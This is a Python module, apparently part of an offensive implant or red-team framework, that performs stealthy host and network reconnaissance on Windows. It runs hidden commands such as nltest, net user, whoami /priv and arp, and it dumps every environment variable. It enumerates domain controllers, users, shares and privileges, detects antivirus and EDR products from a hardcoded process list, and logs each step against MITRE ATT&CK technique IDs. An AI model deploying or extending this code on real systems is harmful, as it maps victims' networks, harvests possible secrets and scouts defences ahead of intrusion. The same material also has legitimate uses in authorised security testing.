# Advanced System Reconnaissance Module
# Implements comprehensive system and network discovery capabilities

import os
import sys
import socket
import subprocess
import psutil
import json
if sys.platform == "win32":
    import winreg
from datetime import datetime
from config import DEBUG_MODE, MITRE_TECHNIQUES
from core.stealth import stealth_manager

class SystemRecon:
    
    def __init__(self):
        self.is_windows = sys.platform == "win32"
        self.system_info = {}
        
    def get_comprehensive_info(self):
        try:
            self.system_info = {
                'timestamp': datetime.now().isoformat(),
                'basic': self.get_basic_system_info(),
                'network': self.get_network_configuration(),
                'security': self.detect_security_software(),
                'domain': self.get_domain_information(),
                'users': self.enumerate_users(),
                'processes': self.get_running_processes(),
                'services': self.get_services(),
                'software': self.get_installed_software(),
                'hardware': self.get_hardware_info(),
                'environment': self.get_environment_variables(),
                'shares': self.discover_network_shares(),
                'privileges': self.get_current_privileges()
            }
            
            self._log_technique('T1082', True, {
                'info_categories': len(self.system_info),
                'method': 'comprehensive_discovery'
            })
            
            return self.system_info
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"System reconnaissance failed: {e}")
                )
            self._log_technique('T1082', False, {'error': str(e)})
            return {}
    
    def get_basic_system_info(self):
        try:
            info = {
                'hostname': socket.gethostname(),
                'os_type': os.name,
                'platform': sys.platform,
                'architecture': os.environ.get('PROCESSOR_ARCHITECTURE', 'unknown'),
                'username': os.getlogin(),
                'user_domain': os.environ.get('USERDOMAIN', 'unknown'),
                'computer_name': os.environ.get('COMPUTERNAME', 'unknown'),
                'system_root': os.environ.get('SYSTEMROOT', 'unknown')
            }
            
            if self.is_windows:
                info.update(self._get_windows_version_info())
            
            # Get system uptime
            try:
                boot_time = psutil.boot_time()
                info['boot_time'] = datetime.fromtimestamp(boot_time).isoformat()
                info['uptime_seconds'] = int(datetime.now().timestamp() - boot_time)
            except Exception:
                pass
            
            return info
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Basic system info gathering failed: {e}")
                )
            return {}
    
    def _get_windows_version_info(self):
        try:
            import platform
            
            info = {
                'os_version': platform.version(),
                'os_release': platform.release(),
                'machine': platform.machine(),
                'processor': platform.processor()
            }
            
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
                )
                
                build_number = winreg.QueryValueEx(key, "CurrentBuild")[0]
                product_name = winreg.QueryValueEx(key, "ProductName")[0]
                
                info['build_number'] = build_number
                info['product_name'] = product_name
                
                winreg.CloseKey(key)
                
            except Exception:
                pass
            
            return info
            
        except Exception:
            return {}
    
    def get_network_configuration(self):
        try:
            network_info = {
                'interfaces': [],
                'routing_table': [],
                'dns_servers': [],
                'arp_table': []
            }
            
            # Get network interfaces
            for interface, addrs in psutil.net_if_addrs().items():
                interface_info = {
                    'name': interface,
                    'addresses': []
                }
                
                for addr in addrs:
                    interface_info['addresses'].append({
                        'family': str(addr.family),
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast
                    })
                
                network_info['interfaces'].append(interface_info)
            
            # Get network statistics
            try:
                net_stats = psutil.net_io_counters()
                network_info['statistics'] = {
                    'bytes_sent': net_stats.bytes_sent,
                    'bytes_recv': net_stats.bytes_recv,
                    'packets_sent': net_stats.packets_sent,
                    'packets_recv': net_stats.packets_recv
                }
            except Exception:
                pass
            
            if self.is_windows:
                network_info.update(self._get_windows_network_info())
            
            return network_info
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Network configuration gathering failed: {e}")
                )
            return {}
    
    def _get_windows_network_info(self):
        network_info = {}
        
        try:
            # Get routing table
            result = subprocess.run([
                'route', 'print'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                network_info['routing_table'] = result.stdout
            
        except Exception:
            pass
        
        try:
            # Get ARP table
            result = subprocess.run([
                'arp', '-a'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                network_info['arp_table'] = result.stdout
            
        except Exception:
            pass
        
        try:
            result = subprocess.run([
                'ipconfig', '/all'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                network_info['ipconfig'] = result.stdout
            
        except Exception:
            pass
        
        return network_info
    
    def detect_security_software(self):
        security_products = {
            'antivirus': [],
            'edr': [],
            'firewall': [],
            'processes': [],
            'services': []
        }
        
        try:
            security_processes = {
                'antivirus': [
                    'avp.exe', 'mcshield.exe', 'windefend.exe', 'msmpeng.exe',
                    'savservice.exe', 'fsav32.exe', 'avgnt.exe', 'avguard.exe',
                    'bdagent.exe', 'vsserv.exe', 'nod32krn.exe', 'ekrn.exe'
                ],
                'edr': [
                    'csagent.exe', 'csfalconservice.exe', 'cb.exe', 'cbstream.exe',
                    'cyserver.exe', 'cyoptics.exe', 'sentinelagent.exe', 'sentinelctl.exe',
                    'taniumclient.exe', 'taniumdetectengine.exe'
                ],
                'firewall': [
                    'zlclient.exe', 'outpost.exe', 'fpavserver.exe', 'fpscan.exe'
                ]
            }
            
            # Check running processes
            for proc in psutil.process_iter(['name', 'pid']):
                try:
                    proc_name = proc.info['name'].lower()
                    
                    for category, processes in security_processes.items():
                        if proc_name in processes:
                            security_products[category].append({
                                'name': proc.info['name'],
                                'pid': proc.info['pid']
                            })
                            
                except Exception:
                    continue
            
            if self.is_windows:
                security_products.update(self._check_installed_security_software())
            
            if self.is_windows:
                defender_status = self._check_windows_defender()
                if defender_status:
                    security_products['windows_defender'] = defender_status
            
            return security_products
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Security software detection failed: {e}")
                )
            return {}
    
    def _check_installed_security_software(self):
        security_software = {
            'installed_programs': []
        }
        
        try:
            uninstall_keys = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            security_keywords = [
                'antivirus', 'anti-virus', 'security', 'defender', 'firewall',
                'endpoint', 'protection', 'guard', 'shield', 'safe'
            ]
            
            for key_path in uninstall_keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            
                            try:
                                display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                
                                if any(keyword in display_name.lower() for keyword in security_keywords):
                                    security_software['installed_programs'].append(display_name)
                                    
                            except FileNotFoundError:
                                pass
                            
                            winreg.CloseKey(subkey)
                            
                        except Exception:
                            continue
                    
                    winreg.CloseKey(key)
                    
                except Exception:
                    continue
            
        except Exception:
            pass
        
        return security_software
    
    def _check_windows_defender(self):
        try:
            result = subprocess.run([
                'powershell', '-Command', 'Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                return {
                    'status': 'active' if 'False' in result.stdout else 'disabled',
                    'output': result.stdout.strip()
                }
                
        except Exception:
            pass
        
        return None
    
    def get_domain_information(self):
        domain_info = {}
        
        try:
            # Basic domain info from environment
            domain_info.update({
                'user_domain': os.environ.get('USERDOMAIN', ''),
                'logon_server': os.environ.get('LOGONSERVER', ''),
                'user_dns_domain': os.environ.get('USERDNSDOMAIN', '')
            })
            
            if self.is_windows:
                domain_info.update(self._get_windows_domain_info())
            
            self._log_technique('T1087.002', True, {
                'domain': domain_info.get('user_domain', 'unknown')
            })
            
            return domain_info
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Domain information gathering failed: {e}")
                )
            self._log_technique('T1087.002', False, {'error': str(e)})
            return {}
    
    def _get_windows_domain_info(self):
        domain_info = {}
        
        try:
            # Get domain controllers
            result = subprocess.run([
                'nltest', '/dclist:'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                domain_info['domain_controllers'] = result.stdout
            
        except Exception:
            pass
        
        try:
            # Get domain trusts
            result = subprocess.run([
                'nltest', '/domain_trusts'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                domain_info['domain_trusts'] = result.stdout
            
        except Exception:
            pass
        
        return domain_info
    
    def enumerate_users(self):
        users_info = {
            'local_users': [],
            'current_user': {},
            'logged_in_users': []
        }
        
        try:
            # Current user info
            users_info['current_user'] = {
                'username': os.getlogin(),
                'home_directory': os.path.expanduser('~'),
                'uid': os.getuid() if hasattr(os, 'getuid') else None
            }
            
            # Get logged in users
            for user in psutil.users():
                users_info['logged_in_users'].append({
                    'name': user.name,
                    'terminal': user.terminal,
                    'host': user.host,
                    'started': datetime.fromtimestamp(user.started).isoformat()
                })
            
            if self.is_windows:
                users_info.update(self._get_windows_users())
            
            self._log_technique('T1087.001', True, {
                'local_users_count': len(users_info['local_users']),
                'logged_in_count': len(users_info['logged_in_users'])
            })
            
            return users_info
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"User enumeration failed: {e}")
                )
            self._log_technique('T1087.001', False, {'error': str(e)})
            return {}
    
    def _get_windows_users(self):
        users_info = {}
        
        try:
            result = subprocess.run([
                'net', 'user'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                users_info['net_user_output'] = result.stdout
            
        except Exception:
            pass
        
        return users_info
    
    def get_running_processes(self):
        processes = []
        
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline', 'create_time']):
                try:
                    proc_info = proc.info
                    proc_info['create_time'] = datetime.fromtimestamp(proc_info['create_time']).isoformat()
                    processes.append(proc_info)
                except Exception:
                    continue
            
            self._log_technique('T1057', True, {
                'process_count': len(processes)
            })
            
            return processes
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Process enumeration failed: {e}")
                )
            self._log_technique('T1057', False, {'error': str(e)})
            return []
    
    def get_services(self):
        services = []
        
        try:
            if self.is_windows:
                services = self._get_windows_services()
            
            return services
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Service enumeration failed: {e}")
                )
            return []
    
    def _get_windows_services(self):
        services = []
        
        try:
            result = subprocess.run([
                'sc', 'query', 'state=', 'all'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                # Parse sc query output
                current_service = {}
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if line.startswith('SERVICE_NAME:'):
                        if current_service:
                            services.append(current_service)
                        current_service = {'name': line.split(':', 1)[1].strip()}
                    elif line.startswith('DISPLAY_NAME:'):
                        current_service['display_name'] = line.split(':', 1)[1].strip()
                    elif line.startswith('STATE'):
                        current_service['state'] = line.split(':', 1)[1].strip()
                
                if current_service:
                    services.append(current_service)
            
        except Exception:
            pass
        
        return services
    
    def get_installed_software(self):
        software = []
        
        try:
            if self.is_windows:
                software = self._get_windows_installed_software()
            
            return software
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Software enumeration failed: {e}")
                )
            return []
    
    def _get_windows_installed_software(self):
        software = []
        
        try:
            uninstall_keys = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for key_path in uninstall_keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            
                            software_info = {}
                            
                            try:
                                software_info['name'] = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            except FileNotFoundError:
                                continue
                            
                            try:
                                software_info['version'] = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                            except FileNotFoundError:
                                software_info['version'] = 'Unknown'
                            
                            try:
                                software_info['publisher'] = winreg.QueryValueEx(subkey, "Publisher")[0]
                            except FileNotFoundError:
                                software_info['publisher'] = 'Unknown'
                            
                            software.append(software_info)
                            winreg.CloseKey(subkey)
                            
                        except Exception:
                            continue
                    
                    winreg.CloseKey(key)
                    
                except Exception:
                    continue
            
        except Exception:
            pass
        
        return software
    
    def get_hardware_info(self):
        hardware_info = {}
        
        try:
            # CPU information
            hardware_info['cpu'] = {
                'count': psutil.cpu_count(),
                'count_logical': psutil.cpu_count(logical=True),
                'frequency': psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None
            }
            
            # Memory information
            memory = psutil.virtual_memory()
            hardware_info['memory'] = {
                'total': memory.total,
                'available': memory.available,
                'percent': memory.percent,
                'used': memory.used
            }
            
            # Disk information
            hardware_info['disks'] = []
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    hardware_info['disks'].append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'fstype': partition.fstype,
                        'total': usage.total,
                        'used': usage.used,
                        'free': usage.free,
                        'percent': (usage.used / usage.total) * 100
                    })
                except Exception:
                    continue
            
            return hardware_info
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Hardware info gathering failed: {e}")
                )
            return {}
    
    def get_environment_variables(self):
        try:
            return dict(os.environ)
        except Exception:
            return {}
    
    def discover_network_shares(self):
        shares = []
        
        try:
            if self.is_windows:
                shares = self._get_windows_shares()
            
            self._log_technique('T1135', True, {
                'shares_found': len(shares)
            })
            
            return shares
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Network share discovery failed: {e}")
                )
            self._log_technique('T1135', False, {'error': str(e)})
            return []
    
    def _get_windows_shares(self):
        shares = []
        
        try:
            result = subprocess.run([
                'net', 'share'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines[1:]:  # Skip header
                    if line.strip() and not line.startswith('-'):
                        parts = line.split()
                        if len(parts) >= 2:
                            shares.append({
                                'name': parts[0],
                                'path': ' '.join(parts[1:]) if len(parts) > 1 else ''
                            })
            
        except Exception:
            pass
        
        return shares
    
    def get_current_privileges(self):
        privileges = {}
        
        try:
            if self.is_windows:
                privileges = self._get_windows_privileges()
            
            return privileges
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Privilege enumeration failed: {e}")
                )
            return {}
    
    def _get_windows_privileges(self):
        privileges = {}
        
        try:
            result = subprocess.run([
                'whoami', '/priv'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                privileges['whoami_priv'] = result.stdout
            
        except Exception:
            pass
        
        try:
            result = subprocess.run([
                'whoami', '/groups'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                privileges['whoami_groups'] = result.stdout
            
        except Exception:
            pass
        
        return privileges
    
    def _log_technique(self, technique_id, success, details):
        """Log MITRE ATT&CK technique execution"""
        if DEBUG_MODE:
            technique_name = MITRE_TECHNIQUES.get(technique_id, 'Unknown')
            stealth_manager.safe_execute(
                lambda: print(f"Technique {technique_id} ({technique_name}): {'Success' if success else 'Failed'}")
            )

# Global reconnaissance manager instance
recon_manager = SystemRecon()